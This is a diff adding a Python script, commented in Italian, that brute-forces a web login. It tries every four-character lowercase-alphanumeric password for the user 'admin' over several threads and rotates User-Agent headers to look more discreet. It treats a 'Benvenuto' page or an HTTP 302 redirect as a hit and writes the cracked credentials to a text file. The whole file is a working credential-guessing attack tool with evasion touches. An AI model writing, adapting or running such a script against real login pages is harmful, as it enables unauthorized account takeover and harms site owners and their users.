@@ -1,0 +1,67 @@
+import itertools
+import string
+import requests
+import random
+from concurrent.futures import ThreadPoolExecutor
+
+# Configurazione del target
+URL_LOGIN = "http://192.168.1" # Assicurati che l'URL sia completo
+THREADS = 5  # Ridotto leggermente per essere più discreto
+LUNGHEZZA_MAX = 4
+
+# Lista di User-Agent per simulare browser diversi
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0"
+]
+
+def salva_risultato(utente, password):
+    """Crea e scrive le credenziali corrette su un file di testo."""
+    with open("credenziali_trovate.txt", "a") as f:
+        f.write(f"Target: {URL_LOGIN}\n")
+        f.write(f"Utente: {utente}\n")
+        f.write(f"Password: {password}\n")
+        f.write("-" * 20 + "\n")
+
+def tenta_login(credenziali):
+    utente, password = credenziali
+    dati = {'username': utente, 'password': password}
+    # Sceglie un browser a caso per ogni tentativo
+    headers = {'User-Agent': random.choice(USER_AGENTS)}
+    
+    try:
+        risposta = requests.post(URL_LOGIN, data=dati, headers=headers, timeout=5)
+        
+        # LOGICA DI SUCCESSO: personalizza "Benvenuto" in base al sito
+        if "Benvenuto" in risposta.text or risposta.status_code == 302:
+            print(f"\n\n[!!!] SUCCESSO: {utente}:{password}")
+            salva_risultato(utente, password)
+            return True
+    except Exception as e:
+        # In caso di errore di connessione (ban IP), lo script si ferma per quel thread
+        pass
+    return False
+
+def avvio():
+    caratteri = string.ascii_lowercase + string.digits
+    
+    # Generatore: prova utente 'admin' e tutte le pass di lunghezza LUNGHEZZA_MAX
+    combinazioni = (
+        ("admin", "".join(p)) 
+        for p in itertools.product(caratteri, repeat=LUNGHEZZA_MAX)
+    )
+
+    print(f"[*] Avvio attacco su {URL_LOGIN}")
+    print(f"[*] Risultati verranno salvati in 'credenziali_trovate.txt'")
+
+    with ThreadPoolExecutor(max_workers=THREADS) as executor:
+        for risultato in executor.map(tenta_login, combinazioni):
+            if risultato:
+                print("[*] Test terminato con successo.")
+                # Chiude forzatamente i thread rimanenti
+                executor.shutdown(wait=False, cancel_futures=True)
+                return
+
+if __name__ == "__main__":
+    avvio()
